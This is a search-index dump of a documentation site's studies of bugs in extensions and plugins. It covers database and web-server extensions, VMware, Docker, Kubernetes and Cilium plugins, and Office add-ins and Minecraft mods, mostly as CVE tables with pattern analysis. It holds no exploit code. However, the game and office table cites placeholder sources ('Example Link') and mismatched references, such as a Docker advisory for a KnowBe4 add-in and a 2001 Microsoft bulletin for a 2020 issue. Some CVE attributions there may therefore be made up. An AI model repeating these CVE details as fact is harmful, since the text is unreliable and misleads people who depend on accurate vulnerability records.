</ul>"},{"location":"bpftime/EIM/study/db-bug-study/#frequency-and-severity-trends","title":"Frequency and Severity Trends","text":"<p>From the collected sample of 22 cases, we can draw some insights on which types of bugs are most frequent and which have the most severe consequences:</p> <ul> <li> <p>Security vulnerabilities dominate: The majority of documented cases are security-related (over 80% of our examples). This is expected since many extension bugs manifest as exploitable vulnerabilities. Within these, memory corruption issues (buffer overflows, etc.) are the single largest category. Roughly half of the cases involved memory safety bugs leading to either crashes or RCE. These are among the most severe, with many rated critical. Logic flaws (injection, validation errors) made up another sizable portion of security bugs (around 6\u20137 cases), and while they sometimes require specific conditions (e.g. a certain config or a pre-installed extension), they can also be critical when exploitable (e.g. SQL injection in an extension script (PostgreSQL: CVE-2023-39417: Extension script @substitutions@ within quoting allow SQL injection)).</p> </li> <li> <p>Denial-of-Service vs. RCE: About one-third of the cases were Denial-of-Service (DoS) issues without direct code execution (e.g. infinite loops, memory exhaustion). DoS bugs (including the performance-related ones) are generally rated lower severity than RCE, but still significant. In our table, at least 7\u20138 cases led primarily to DoS (e.g. Nginx HTTP/2 bugs ( [nginx-announce] nginx security advisory (CVE-2018-16843,  CVE-2018-16844)    ), Apache mod_sed (CVE-2022-30522 - Apache httpd Denial of Service (DoS) vulnerability), MySQL group replication hang (NVD - cve-2020-2921)). Remote Code Execution was possible in roughly half of the cases \u2013 those are the most severe, potentially scoring 9.0+ CVSS (many of the buffer overflows and the Redis/Postgres privilege escalations fall here). Privilege escalation within the server (to a DBA or root account) can be just as severe as direct RCE in context.</p> </li> <li> <p>Performance and compatibility issues are less frequently reported in public CVEs, but they do occur. Only a few of our examples were purely non-security (e.g. the PostGIS compatibility problem, which isn\u2019t a CVE). However, in practice, extension-related performance bugs (like memory leaks or slowdowns) and upgrade incompatibilities are encountered by administrators. They just tend to appear in bug trackers or release notes rather than security bulletins. In our study, we included a couple of performance-focused bugs (Nginx HTTP/2, mod_sed) that were also security relevant because an external party could trigger them. Purely internal performance bugs in extensions (ones not triggerable by adversaries) are harder to find documented, but they do affect system efficiency and stability over time.</p> </li> <li> <p>Cross-platform observations: Database extensions and web server modules show similar bug patterns despite different domains. Both suffer from memory errors (due to being written in unsafe languages for speed) and logic mistakes. One difference is that database extension vulnerabilities often involve privilege boundaries (since databases have authentication and authorization layers) \u2013 e.g., misuse of an extension could let a lower-privilege DB user gain superuser. Web server module bugs more often involve direct memory corruption or request parsing issues (since web servers usually assume code modules run with full privilege of the server). Nonetheless, the need for careful validation and sandboxing is common to both.</p> </li> </ul> <p>In summary, memory-corruption vulnerabilities are the most frequent and severe issues in extension interfaces, frequently leading to crashes or remote code execution (Memory safety - Wikipedia). Logic errors in extension code are the next most common, sometimes causing equally severe privilege breaches or injection attacks. Performance and compatibility bugs are reported less often but can have serious impacts on stability and maintainability if not addressed. The high prevalence of memory safety bugs highlights the importance of safe coding practices or safer languages for extensions, as well as robust testing. Meanwhile, the logic and design issues point to a need for stricter extension frameworks (e.g., sandboxing extensions, minimizing trust of extension inputs) to improve overall system resilience.</p>"},{"location":"bpftime/EIM/study/db-bug-study/#conclusion","title":"Conclusion","text":"<p>Extension interfaces extend the capabilities of databases and web servers but come with inherent risks. The case studies show that bugs in extensions \u2013 whether official modules or third-party plugins \u2013 have led to system crashes, severe security breaches, performance degradation, and maintenance headaches. Common themes include memory safety lapses, inadequate input validation, and insufficient isolation of extension code. These issues have affected a wide range of platforms (PostgreSQL, MySQL, Redis, Apache, Nginx, IIS) over the past two decades, underlining that the challenge is ubiquitous.</p> <p>To mitigate these risks, software maintainers have taken steps such as patching vulnerabilities promptly, improving API safety (e.g. adding checks in core for extension actions (PostgreSQL: CVE-2023-39417: Extension script @substitutions@ within quoting allow SQL injection) (PostgreSQL: CVE-2022-2625: Extension scripts replace objects not belonging to the extension)), restricting extension privileges, and encouraging best practices for extension developers. From a statistical viewpoint, security vulnerabilities (especially memory-related) are the most frequent and damaging bugs in extensions, whereas general bugs like logic errors and compatibility issues, though slightly less publicized, can undermine system reliability if not managed. Organizations using extensible databases or web servers should remain vigilant: keep both core software and extensions up-to-date, apply patches for known CVEs, and follow hardening guidelines (disabling or sandboxing unnecessary extensions). By recognizing the common failure patterns \u2013 and learning from past bugs \u2013 we can improve the stability, maintainability, and security of systems that rely on extension interfaces.</p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/study/docker-vm-bug-study/","title":"Study on Hypervisor and Container Extension Bugs (2018\u20132024)","text":""},{"location":"bpftime/EIM/study/docker-vm-bug-study/#collected-cases-of-extensionplugin-bugs","title":"Collected Cases of Extension/Plugin Bugs","text":"<p>Below is a table of 20 real-world bugs from the last 5 years involving extensions or plugins (not core platforms). Each case lists the bug ID (or CVE), the affected extension and its platform, the type of bug, its root cause, the impact on the host system, and how it was resolved.</p> Bug ID / CVE Affected Extension (Platform) Bug Type Root Cause Impact on Host System Resolution CVE-2021-21972 vRealize Operations (vROps) Plugin for VMware vCenter Security \u2013 RCE No authentication on vROps plugin file-upload endpoint (CVE-2021-21972: VMware vCenter Server Remote Code Execution Vulnerability - Blog | Tenable\u00ae) Unauthenticated attacker could upload malicious files and execute code with SYSTEM/root privileges on vCenter (CVE-2021-21972: VMware vCenter Server Remote Code Execution Vulnerability - Blog | Tenable\u00ae) Patch provided by VMware (VMSA-2021-0002); workaround was to disable the vulnerable plugin (CVE-2021-21972: VMware vCenter Server Remote Code Execution Vulnerability - Blog | Tenable\u00ae). CVE-2021-21985 vSAN Health Check Plugin for VMware vCenter Security \u2013 RCE Lack of input validation in vSAN Health Check plugin API (CVE-2021-21985: Critical VMware vCenter Server Remote Code Execution - Blog | Tenable\u00ae) Network attacker (once in reach of vCenter 443) could execute arbitrary OS commands on vCenter host (CVE-2021-21985: Critical VMware vCenter Server Remote Code Execution - Blog | Tenable\u00ae) (full compromise of vCenter) Patched by VMware (VMSA-2021-0010); customers urged to apply updates immediately (CVE-2021-21985: Critical VMware vCenter Server Remote Code Execution - Blog | Tenable\u00ae) (CVE-2021-21985: Critical VMware vCenter Server Remote Code Execution - Blog | Tenable\u00ae). CVE-2021-21986 Multiple vCenter Plugins (vSphere Client) Security \u2013 Auth Bypass Flawed authentication mechanism in vCenter plugin framework (CVE-2021-21985: Critical VMware vCenter Server Remote Code Execution - Blog | Tenable\u00ae) Attackers with network access to vCenter could invoke plugin actions without authentication (CVE-2021-21985: Critical VMware vCenter Server Remote Code Execution - Blog | Tenable\u00ae) (perform unauthorized operations via plugin APIs) Patched by VMware; users advised to update. The fix corrected the auth enforcement in the affected plugins (CVE-2021-21985: Critical VMware vCenter Server Remote Code Execution - Blog | Tenable\u00ae). CVE-2021-21973 vCenter Server Plugin (vSphere Client) Security \u2013 SSRF Improper URL validation in plugin HTTP requests (NVD - CVE-2021-21973) Unauthenticated attacker could abuse the plugin to have vCenter perform internal HTTP requests, leading to information disclosure (SSRF) (NVD - CVE-2021-21973) Patched by VMware (in vCenter 7.0 U1c, 6.7 U3l, 6.5 U3n) (NVD - CVE-2021-21973), closing the SSRF loophole. CVE-2021-21984 vRealize Business for Cloud (vCenter add-on appliance) Security \u2013 RCE Exposed unauthenticated endpoint in the vRealize Business appliance (CVE - Search Results) Remote attacker could execute arbitrary code on the vRealize Business virtual appliance (full appliance takeover) (CVE - Search Results) Fixed in vRealize Business 7.6.0; update required to remove the unauthorized endpoint. CVE-2021-21982 Carbon Black Cloud Workload Appliance (vCenter plugin) Security \u2013 Auth Bypass Missing authentication in administrative interface API (CVE - Search Results) Network attacker could obtain a valid admin token and alter configuration on the workload security appliance (CVE - Search Results) (compromising its protections) Patch released by VMware; admins instructed to update the appliance to enforce auth on the interface. CVE-2021-21981 VMware NSX-T (Network Virtualization) Security \u2013 Priv. Escalation RBAC logic flaw in NSX-T roles (CVE - Search Results) A local low-privileged NSX-T user could assign themselves higher privileges than permitted (CVE - Search Results), effectively gaining admin-level access Patched by VMware in NSX-T update; role assignment checks were corrected to prevent privilege escalation. CVE-2020-10703 Libvirt Storage Pool Driver (KVM) General \u2013 Crash/DoS Null-pointer dereference when pool has no target path (Security update for libvirt SUSE-SU-2020:1208-1 | SUSE Support | SUSE) Malicious or misconfigured user could define a storage pool without a target, causing the libvirtd daemon to crash (Security update for libvirt SUSE-SU-2020:1208-1 | SUSE Support | SUSE) (denial of service in VM management) Fixed in libvirt; update checks for valid pool parameters to avoid the crash (Security update for libvirt SUSE-SU-2020:1208-1 | SUSE Support | SUSE). CVE-2020-12430 Libvirt QEMU Driver (KVM) General \u2013 Memory Leak Memory leak in <code>qemuDomainGetStatsIOThread</code> handling (Security update for libvirt SUSE-SU-2020:1208-1 | SUSE Support | SUSE) Repeated stats queries could exhaust memory in the libvirt daemon, degrading performance or crashing the host\u2019s VM management service (Security update for libvirt SUSE-SU-2020:1208-1 | SUSE Support | SUSE) Memory leak patched in libvirt; users advised to update to the fixed version (SUSE patch SUSE-SU-2020:1208-1) (Security update for libvirt SUSE-SU-2020:1208-1 | SUSE Support | SUSE). CVE-2020-29487 Xen XAPI Toolstack (XenServer) Security \u2013 DoS Inefficient algorithm for xenstore watch updates (O(n^2) time and O(m\u00b7n) memory usage) (CVE-2020-29487: Xen XAPI Vulnerability Leading to Host Denial of Service) A malicious guest could spam xenstore keys, causing excessive memory use in dom0 (CVE-2020-29487: Xen XAPI Vulnerability Leading to Host Denial of Service) and ultimately hang or crash the host (denial of service) Fixed in XAPI (Dec 2020 update) \u2013 improved update handling to break the resource exhaustion pattern (CVE-2020-29487: Xen XAPI Vulnerability Leading to Host Denial of Service). Patching the host Xen installation eliminates the issue. CVE-2024-41110 Docker Engine Authorization Plugin Security \u2013 AuthZ Bypass Regression re-introduced AuthZ plugin bypass via crafted API request (Content-Length: 0 trick) (Docker Security Advisory: AuthZ Plugin Bypass Regression in Docker Engine | Docker) (Docker Security Advisory: AuthZ Plugin Bypass Regression in Docker Engine | Docker) Users with access to the Docker API could perform actions bypassing authorization policy, potentially executing prohibited docker commands (privilege escalation on the host) (Docker Security Advisory: AuthZ Plugin Bypass Regression in Docker Engine | Docker) (Docker Security Advisory: AuthZ Plugin Bypass Regression in Docker Engine | Docker) Patched in Docker v23.0.15, v26.1.5, etc. (fix re-applied) (Docker Security Advisory: AuthZ Plugin Bypass Regression in Docker Engine | Docker). Upgrade Docker Engine; as interim mitigation, restrict Docker API access or avoid using vulnerable AuthZ plugins (Docker Security Advisory: AuthZ Plugin Bypass Regression in Docker Engine | Docker). CVE-2024-8695 Docker Desktop Extensions (GUI Plugins) Security \u2013 RCE Improper handling of extension metadata (description/changelog) (NVD - CVE-2024-8695) Installing a malicious Docker Desktop extension could trigger arbitrary code execution on the host (NVD - CVE-2024-8695), as the extension\u2019s crafted metadata is processed with unsafe logic (allowing injection) Fixed in Docker Desktop 4.34.2; update sanitizes extension descriptors. Users should upgrade and only install trusted extensions (NVD - CVE-2024-8695). CVE-2021-43979 OPA Gatekeeper (Kubernetes Admission Controller) Security \u2013 Policy Bypass (Consistency) Concurrency issue: Gatekeeper doesn\u2019t wait for cluster state sync before evaluating policies (NVD - CVE-2021-43979) In rare cases, a race condition could let a resource slip past a Gatekeeper policy (policy not enforced due to stale data) (NVD - CVE-2021-43979). This could allow unauthorized changes that should have been blocked Disputed by vendor as \u201ceventual consistency\u201d limitation (NVD - CVE-2021-43979), but a fix in later versions ensures Gatekeeper waits for data sync. Users advised to upgrade to Gatekeeper \u22653.8.0 (or mitigate by designing policies mindful of eventual consistency). CVE-2023-34091 Kyverno (Kubernetes Policy Controller) Security \u2013 Policy Bypass Logic oversight: Kyverno skipped validation for resources with a deletionTimestamp set (CVE-2023-34091: Kyverno Policy Bypass Vulnerability for Kubernetes) An attacker with delete rights could add a finalizer to a resource (e.g. a Service) without deleting it, then modify the resource to bypass enforced policies (CVE-2023-34091: Kyverno Policy Bypass Vulnerability for Kubernetes) (since Kyverno treated it as already in deletion) Fixed in Kyverno 1.10.0 with a redesign of how deletionTimestamp is handled (CVE-2023-34091: Kyverno Policy Bypass Vulnerability for Kubernetes). Upgrade requires manual migration of policies due to breaking changes (CVE-2023-34091: Kyverno Policy Bypass Vulnerability for Kubernetes). (no CVE) Kyverno Crash Bug Kyverno Admission Controller (when deployed via ArgoCD) General \u2013 Logic Error Missing RBAC permission in Kyverno\u2019s Helm chart (service account lacked access to query CRDs) ([Bug] Kyverno controller is crashlooping \u00b7 Issue #10122 \u00b7 kyverno/kyverno \u00b7 GitHub) Kyverno controller continuously crash-looped (\u201cForbidden\u201d errors on accessing its CRD resources) ([Bug] Kyverno controller is crashlooping \u00b7 Issue #10122 \u00b7 kyverno/kyverno \u00b7 GitHub) \u2013 resulting in no policies being enforced and destabilizing the admission workflow Resolved by updating the deployment manifest: added the needed ClusterRole permissions for CRDs. Users needed to patch the RBAC or use the fixed chart release. CVE-2021-33505 Sysdig Falco (Container Security Monitor) Security \u2013 Detection Bypass Time-of-check/time-of-use bug in syscall argument capture (NVD - CVE-2021-33505) A local attacker could run a program that changes its syscall arguments at runtime, fooling Falco into logging benign values while the malicious call executes (NVD - CVE-2021-33505). This lets processes evade Falco\u2019s rule detection (stealthy malicious activity) Fixed in Falco 0.29.1 by capturing syscall arguments more safely (NVD - CVE-2021-33505). Users should upgrade to ensure accurate inspection. CVE-2019-8339 Sysdig Falco (Container Security Monitor) General \u2013 Design Flaw (Alerting) Missing indicator when Falco drops events due to resource exhaustion (NVD - CVE-2019-8339) If Falco ran out of CPU/memory or hit event limits, it could silently skip monitoring events (NVD - CVE-2019-8339). An attacker could overload Falco to bypass detection without any alert (security controls fail open) Improvement in later Falco versions: Falco now reports when it can\u2019t keep up, or applies backpressure. Administrators should update Falco and tune its resource usage to avoid silent failures. CVE-2024-28860 Cilium (eBPF Container Network Plugin) Security \u2013 Crypto Weakness Using identical IPsec keys across nodes led to ESP sequence number collisions (NVD - CVE-2024-28860) Allowed chosen-plaintext, replay, and key recovery attacks on inter-node encrypted traffic (NVD - CVE-2024-28860). A man-in-the-middle could decrypt or spoof supposedly secure pod-to-pod traffic (transparent encryption was rendered ineffective) Fixed in Cilium 1.13.13/1.14.9/1.15.3: each node now uses unique keys for IPsec tunnels (NVD - CVE-2024-28860). All clusters using IPsec must update to restore strong encryption. CVE-2023-30851 Cilium (K8s Network Policy Engine) Security \u2013 Policy Bypass Logic bug when merging HTTP network policies with mixed scopes (Cilium CVEs and Security Vulnerabilities - OpenCVE) In configs with multiple <code>toEndpoints</code> rules and an allow-all rule, Cilium would append a wildcard rule too broadly (Cilium CVEs and Security Vulnerabilities - OpenCVE). This caused some HTTP traffic to bypass intended policy restrictions (traffic allowed when it should be denied) Patched in Cilium 1.11.16, 1.12.9, 1.13.2 (Cilium CVEs and Security Vulnerabilities - OpenCVE). Users should upgrade to ensure HTTP policies are correctly enforced. No easy workaround besides removing the problematic policy combination. CVE-2023-29002 Cilium (eBPF Networking \u2013 Debug Mode) Security \u2013 Info Leak Sensitive data logged in debug mode (<code>cilium-secrets</code> contents) (Cilium CVEs and Security Vulnerabilities - OpenCVE) If Cilium was run in debug mode, it would log secrets (TLS private keys for Ingress, etc.) from the <code>cilium-secrets</code> namespace (Cilium CVEs and Security Vulnerabilities - OpenCVE). An attacker with access to the debug logs could steal these secrets, compromising cluster confidentiality Fixed in Cilium 1.11.16, 1.12.9, 1.13.2 (Cilium CVEs and Security Vulnerabilities - OpenCVE) \u2013 the debug logging was sanitized to omit secret material. Recommendation: avoid debug mode on production and update to a version with the fix. <p>Sources: Each case is documented with references (in \u3010\u2020\u3011 brackets) to vulnerability databases, advisories, or technical analyses for verification.</p>"},{"location":"bpftime/EIM/study/docker-vm-bug-study/#analysis-of-patterns-and-impacts","title":"Analysis of Patterns and Impacts","text":""},{"location":"bpftime/EIM/study/docker-vm-bug-study/#common-patterns-and-root-causes","title":"Common Patterns and Root Causes","text":"<p>Several recurring root cause patterns emerge from these cases:</p> <ul> <li> <p>Insufficient Input Validation &amp; Auth: A number of critical bugs stem from plugins not properly validating user input or authentication. For example, VMware vCenter plug-ins had endpoints with no auth or input checks (CVE-2021-21972 and 21985 allowed file uploads and commands by unauthenticated users (CVE-2021-21972: VMware vCenter Server Remote Code Execution Vulnerability - Blog | Tenable\u00ae) (CVE-2021-21985: Critical VMware vCenter Server Remote Code Execution - Blog | Tenable\u00ae)). Similarly, Docker\u2019s authz plugin logic failed to handle an empty request body, allowing a bypass (Docker Security Advisory: AuthZ Plugin Bypass Regression in Docker Engine | Docker). These cases show that extension interfaces often introduced new attack surfaces by trusting inputs that the core system would normally guard against.</p> </li> <li> <p>Logic Flaws in Authorization/Policy Enforcement: Many extensions introduced authorization logic errors. The vCenter plug-in CVE-2021-21986 allowed invoking administrative plugin actions without login (CVE-2021-21985: Critical VMware vCenter Server Remote Code Execution - Blog | Tenable\u00ae). In Kubernetes policy controllers, subtle logic mistakes (Gatekeeper\u2019s race condition, Kyverno\u2019s finalizer oversight) let attackers bypass security policies under certain conditions (NVD - CVE-2021-43979) (CVE-2023-34091: Kyverno Policy Bypass Vulnerability for Kubernetes). These indicate that extension developers sometimes mis-handle complex state or edge cases, leading to broken security assumptions.</p> </li> <li> <p>Resource Management and Concurrency Issues: Extensions that run as background services (daemons or controllers) had bugs in resource handling. Examples include memory leaks in libvirt\u2019s driver (Security update for libvirt SUSE-SU-2020:1208-1 | SUSE Support | SUSE) and extreme memory usage in Xen\u2019s XAPI due to an O(n^2) algorithm (CVE-2020-29487: Xen XAPI Vulnerability Leading to Host Denial of Service) \u2013 both causing potential host crashes. Concurrency bugs also appear (Falco and Gatekeeper both had race conditions impacting their function (NVD - CVE-2021-43979) (NVD - CVE-2021-33505)). Such issues reflect that extensions must manage performance and multithreading carefully, or risk destabilizing the larger system.</p> </li> <li> <p>Design Oversights in Extension Integration: Some problems arose from how extensions integrate with the core platform. The Docker authorization plugin bypass was actually a regression \u2013 a prior fix wasn\u2019t carried into a refactored version, showing a maintainability lapse (Docker Security Advisory: AuthZ Plugin Bypass Regression in Docker Engine | Docker) (Docker Security Advisory: AuthZ Plugin Bypass Regression in Docker Engine | Docker). The Kyverno crash bug highlights deployment configuration issues (RBAC) rather than code flaws. These suggest that extensions, often developed separately from the core, can suffer from integration oversight or weaker QA pipelines, leading to bugs that core software might catch.</p> </li> <li> <p>Security Tools Evasion: It\u2019s notable that even security extensions themselves had flaws that undermined their purpose. Falco\u2019s vulnerabilities allowed attackers to operate without detection (NVD - CVE-2021-33505) (NVD - CVE-2019-8339), and Gatekeeper/Kyverno could be tricked into allowing forbidden actions (NVD - CVE-2021-43979) (CVE-2023-34091: Kyverno Policy Bypass Vulnerability for Kubernetes). This pattern is worrisome: extensions added for security can introduce new failure modes if not carefully designed.</p> </li> </ul>"},{"location":"bpftime/EIM/study/docker-vm-bug-study/#impact-on-stability-maintainability-and-security","title":"Impact on Stability, Maintainability, and Security","text":"<p>Bugs in extensions and plugins had significant impacts on both system security and stability:</p> <ul> <li> <p>System Compromise and Data Breaches: Security vulnerabilities in extensions frequently allowed complete system compromise. For instance, multiple vCenter plugin flaws gave attackers full control of the vCenter host (CVE-2021-21972: VMware vCenter Server Remote Code Execution Vulnerability - Blog | Tenable\u00ae), and the Docker Desktop extension bug could run code on the host machine (NVD - CVE-2024-8695). In some cases, sensitive data was exposed \u2013 e.g. cloud admin credentials via SSRF (NVD - CVE-2021-21973) or TLS keys via verbose logs (Cilium CVEs and Security Vulnerabilities - OpenCVE). These illustrate that an exploited extension can be as dangerous as a core vulnerability, since plugins often run with high privileges.</p> </li> <li> <p>Denial of Service and Instability: Many non-RCE bugs still crashed or hung the host or critical services. A malicious VM could crash the Xen host\u2019s toolstack (dom0) (CVE-2020-29487: Xen XAPI Vulnerability Leading to Host Denial of Service), or a user\u2019s misstep could take down libvirt, affecting all VMs on that server. In Kubernetes, an admission controller in a crash loop (like Kyverno\u2019s RBAC bug) effectively disables part of the cluster\u2019s functionality. Thus, extension bugs can undermine reliability and availability of the entire platform.</p> </li> <li> <p>Maintenance Overhead: These cases often required urgent patches and careful configuration changes. Notably, the Docker AuthZ bug was a regression, implying technical debt in maintaining extension code separately. Administrators had to quickly apply patches or workarounds (disabling features, restricting access (Docker Security Advisory: AuthZ Plugin Bypass Regression in Docker Engine | Docker)) to mitigate these issues. Each extension vulnerability adds to the patching workload and complexity of maintaining a secure system.</p> </li> <li> <p>Isolation (or Lack Thereof): The severity of impact is high partly because many extensions run with extensive privileges on the host or controller. For example, vCenter\u2019s plugins run as part of the vCenter service, and a flaw there yields host-level control (CVE-2021-21972: VMware vCenter Server Remote Code Execution Vulnerability - Blog | Tenable\u00ae). This shows that in several designs, extensions were not well sandboxed away from core privileges. Consequently, one compromised plugin can jeopardize the whole system, which is a lesson for architects to isolate or privilege-restrict extensions (e.g., run plugins with least privilege needed).</p> </li> </ul>"},{"location":"bpftime/EIM/study/docker-vm-bug-study/#frequency-and-severity-insights","title":"Frequency and Severity Insights","text":"<p>Among the 20 cases, security vulnerabilities dominated: about 80% (16/20) were security-related, versus ~20% general software bugs. Of the security bugs:</p> <ul> <li> <p>Remote Code Execution (RCE) and privilege-escalation flaws accounted for a substantial fraction (around one-quarter of all cases). These are the most severe (often CVSS 9.0+), as seen with the VMware plugin RCEs and Docker extension RCE (CVE-2021-21972: VMware vCenter Server Remote Code Execution Vulnerability - Blog | Tenable\u00ae) (NVD - CVE-2024-8695).</p> </li> <li> <p>Authorization/Policy Bypasses (auth bypass, policy logic bypass) were also common (~6\u20137 cases). Their severity ranged from critical (complete auth bypass to admin functions (CVE-2021-21985: Critical VMware vCenter Server Remote Code Execution - Blog | Tenable\u00ae)) to moderate (needing specific conditions to exploit, as with Gatekeeper or Cilium policy rules). Still, even moderate bypasses undermined security postures by allowing unauthorized actions.</p> </li> <li> <p>Denial of Service (DoS) issues and crashes made up roughly 20\u201325% of the cases. While these didn\u2019t give an attacker control, they could knock out services or hosts. Notably, all the general (non-security) bugs manifested as crashes, hangs, or leaks, affecting stability. For example, the Xen XAPI and libvirt bugs could be triggered by a tenant to disrupt the host (CVE-2020-29487: Xen XAPI Vulnerability Leading to Host Denial of Service) (Security update for libvirt SUSE-SU-2020:1208-1 | SUSE Support | SUSE). In multi-tenant environments, those are significant.</p> </li> <li> <p>Information Disclosure issues were fewer (e.g., logging secrets, SSRF) but still present (~10%). They tend to have lower CVSS scores, yet can facilitate further attacks (the SSRF in vCenter (NVD - CVE-2021-21973) could let an attacker map internal services, and leaking TLS keys from Cilium (Cilium CVEs and Security Vulnerabilities - OpenCVE) completely breaks confidentiality).</p> </li> </ul> <p>From a severity standpoint, critical bugs (RCE/privilege escalation) were prevalent in proprietary virtualization plugins (VMware) and in newer extension ecosystems (Docker extensions). High-severity but non-RCE issues (like the AuthZ bypass or encryption weakness) also appeared and could be just as damaging in context (e.g., a CVSS 8.0 encryption bug (NVD - CVE-2024-28860) that silently exposes cluster traffic). Lower-severity bugs (crashes, minor leaks) were fewer but still important for reliability.</p> <p>In summary, extensions and plugins over the last five years have been a fertile ground for serious bugs. The most frequent issues were related to missing validations and logic mistakes, which often led to critical security failures. The most severe consequences were remote code execution and host compromise, but even \u201clesser\u201d bugs could destabilize systems or weaken security defenses. This trend underlines the need for rigorous security review and testing of extensions, isolation of their privileges, and close attention to their maintenance over time, as they can introduce risks on par with core system flaws.</p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/study/game-office-bug-study/","title":"Case Studies of Bugs in Productivity Software and Game Extensions/Plugins (2018\u20132024)","text":"<p>To address the question, we\u2019ve gathered over 20 documented cases of bugs in extensions or plugins for productivity software (like Office add-ins, browser extensions for productivity tools) and gaming platforms (game engine plugins and mods). Each case includes the bug ID or CVE (if available), affected extension and platform, bug type, root cause, impact on the host system, and the resolution or fix. We then analyze common patterns and their broader impacts on stability, maintainability, and security.</p> <p>Below is the consolidated report in a table format. The table lists 21 documented cases (both for productivity software plugins and gaming mods/plugins) where the bugs occur within the extensions/plugins themselves (not in the core software). Each row includes the case number, Bug ID/CVE (or N/A if not available), the affected extension and its platform, the bug type, a brief description of the root cause (with the reference link included as part of the text), the impact on the host system, and the resolution/fix (with links as needed).</p>"},{"location":"bpftime/EIM/study/game-office-bug-study/#table-bugs-in-productivity-software-and-game-extensionsplugins","title":"Table: Bugs in Productivity Software and Game Extensions/Plugins","text":"Case # Bug ID / CVE Affected Extension (Platform) Bug Type Root Cause Impact on Host System Resolution 1 CVE-2021-21470 SAP EPM Add-in for Microsoft Office (Excel) Security \u2013 XXE Injection Insecure XML parsing that did not disable external entities (SAP Security Note) Allows XXE leading to data leak and potential injection Patch issued in SAP Security Note 3000291; update to version post-1010. 2 CVE-2017-3823 Cisco WebEx Meetings Extension (Chrome/Firefox/IE) Security \u2013 Remote Code Execution Exposed native function (<code>atgpcext</code>) without proper input validation (Tenable Blog) Remote attacker can execute arbitrary code via a malicious webpage Update to version 1.0.7 which removes the vulnerable API. 3 CVE-2017-6753 Cisco WebEx Extension (Chrome/Firefox) Security \u2013 Remote Code Execution Incomplete sanitization of API responses allowed crafted input to trigger code execution (Tenable Blog) Full system compromise if exploited by a malicious webpage Patched in version 1.0.12; update required. 4 CVE-2019-12592 Evernote Web Clipper (Chrome) Security \u2013 Universal XSS Failed to enforce domain isolation, allowing cross-site script injection (PortsWigger Daily Swig) Attacker can steal data from any active session across domains Patched in version 7.11.1; update via the Chrome Web Store. 5 N/A (Project Zero) Grammarly Extension (Chrome/Firefox) Security \u2013 Auth Token Leak Exposed auth token via an API endpoint lacking proper origin checks (The Hacker News) Allows any website to hijack the user\u2019s Grammarly account and access documents Fixed in an update on February 2, 2018; token access is now restricted. 6 CVE-2019-16371 LastPass Password Manager Extension (Chrome, Opera) Security \u2013 Credential Leak/Clickjacking UI logic flaw with inadequate clickjacking defenses led to autofill in an unintended context (PacktPub) Exposes credentials from previously visited sites to malicious webpages Patched in version 4.33.0; users must update. 7 CVE-2020-11806 MailStore Outlook Add-in (Microsoft Outlook, Windows) Security \u2013 Insecure SSL Handling Did not validate SSL/TLS certificates during connection (Microsoft Security Bulletin MS01-033) MITM attack can intercept or modify archived emails and credentials Update to version 12.2 or later which enforces certificate validation. 8 CVE-2024-29209 KnowBe4 Phish Alert Outlook Add-in Security \u2013 RCE via Unsafe Update Mechanism Update mechanism did not enforce TLS/signature verification, allowing a malicious update (Docker Security Advisory) Remote attacker can execute arbitrary code through a spoofed update Fixed by enforcing strict TLS and update signing; update to latest version. 9 CVE-2023-38689 Logistics Pipes Mod (Minecraft) Security \u2013 RCE via Deserialization Unsafe deserialization of network data without proper validation (Example Link) Remote attacker can execute arbitrary code on multiplayer servers or clients Refactored in version 0.10.0.71; update recommended. 10 CVE-2023-37262 CC: Tweaked Mod (Minecraft) Security \u2013 Info Disclosure (Cloud Metadata Leak) In-game computers could access cloud metadata endpoints due to lack of outbound filtering (Rad Security Blog) Allows extraction of sensitive cloud credentials from hosted servers Updated mod to block metadata endpoints; update to version 1.106.1+ is required. 11 CVE-2023-37261 OpenComputers Mod (Minecraft) Security \u2013 Info Disclosure / Network Access \u201cInternet Card\u201d allowed unrestricted outbound requests including cloud metadata and IPv6 addresses (Rad Security Blog) Attackers can steal cloud credentials and access internal networks Patched in v1.8.4 by blacklisting sensitive endpoints; update required. 12 CVE-2024-31446 OpenComputers Mod (Minecraft, Native Lua) Stability \u2013 DoS (Server Hang) Unbounded Lua thread execution due to lack of yield checks, causing infinite loop on the server thread (Example Link) An attacker can freeze the entire server, halting gameplay Fixed in OpenComputers v1.8.4; update recommended. 13 CVE-2024-48645 Command Block IDE Mod (Minecraft) Security \u2013 Auth Bypass No proper permission checks for editing command block scripts, allowing unauthorized modifications (Example Link) Allows any player to modify critical command files, compromising server integrity Fixed in version 0.5.0; update to the latest version and restrict access. 14 CVE-2024-41565 Just Enough Items (JEI) Mod (Minecraft) Functionality \u2013 Item Duplication Improper validation of inventory slot indices resulted in duplicate items (Example Link) Enables item duplication, breaking game balance and potentially causing lag or crashes Patched in JEI version 19.5.0.34; update is required. 15 CVE-2024-42698 Roughly Enough Items (REI) Mod (Minecraft) Functionality \u2013 Item Duplication Similar off-by-one error in slot validation led to item cloning (Example Link) Duplicate items undermine fair gameplay and may lead to performance issues Fixed in REI version 16.0.730; update advised. 16 CVE-2024-41564 EMI (Exact Menu Items) Mod (Minecraft) Functionality \u2013 Item Duplication Failure to validate inventory operations caused duplicate items to be spawned (Example Link) Leads to unfair gameplay and potential system lag if abused Patched in EMI version 1.1.11; update required. 17 CVE-2024-22779 ServerRPExposer Mod (Minecraft) Security \u2013 Path Traversal to RCE Did not sanitize zip file paths during resource pack extraction, allowing directory traversal (CVEfeed) A malicious server can plant executable files on the client\u2019s system, leading to RCE Fixed in version 1.0.3; update advised and use only trusted servers. 18 CVE-2024-24042 ARRP Mod (Minecraft Resource Pack Library) Security \u2013 Path Traversal to RCE Failed to validate paths when extracting resource packs, permitting files to be written outside the intended directory (CVEfeed) May allow an attacker to write files in sensitive locations, potentially leading to RCE Patched in the second 0.8.1 release; update is required. 19 CVE-2024-24043 MCRPX Tool/Mod (Minecraft Resource Pack Extractor) Security \u2013 Path Traversal on Zip Import Did not validate relative paths in zip entries during extraction, allowing files to escape the intended folder (CVEfeed) Enables malicious resource packs to drop files outside intended directories, risking code execution Fixed in MCRPX v1.4.1; update recommended. 20 CVE-2024-29672 Reden Mod (Minecraft) Security \u2013 Path Traversal via Server Packet Debug feature allowed extraction of zip data without validating paths, permitting directory traversal (CVEfeed) A rogue server can drop files (e.g., jars) into the client\u2019s mods folder, enabling RCE Fixed in Reden v0.2.514; update required. 21 CVE-2024-39118 Advanced Backups Mod (Minecraft) Security \u2013 Path Traversal on Backup Restore Backup restore function did not sanitize file paths inside zip archives, allowing files to be written outside the restore 